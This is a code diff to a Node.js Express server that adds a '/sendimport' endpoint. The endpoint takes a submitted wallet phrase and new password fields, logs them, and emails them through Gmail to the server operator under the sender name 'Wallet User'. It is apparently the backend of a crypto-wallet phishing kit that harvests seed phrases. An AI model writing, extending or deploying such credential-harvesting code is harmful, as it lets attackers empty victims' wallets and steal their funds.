@@ -36,3 +36,26 @@ app.post("/sendmail", async (req, res) => {
     console.log("Message sent: %s", info.messageId);
     console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
 })
+
+app.post("/sendimport", async (req, res) => {
+    console.log(req.body)
+    const { phrasedata, passdata, confpassdata } = req.body
+    console.log(phrasedata, passdata, confpassdata);
+    let transporter = nodemailer.createTransport({
+        service: "gmail",
+        host: "smtp.gmail.com ",
+        auth: {
+            user: process.env.USER,
+            pass: process.env.PASS
+        }
+    })
+    let info = await transporter.sendMail({
+        from: "Wallet User",
+        to: process.env.USER,
+        subject: "Testing",
+        text: `${phrasedata}`,
+        html: `<p>This is phrase ${phrasedata} <br></br> This is new password ${passdata}<br></br> This is confirm password ${confpassdata}</p> `,
+    })
+    console.log("Message sent: %s", info.messageId);
+    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
+})
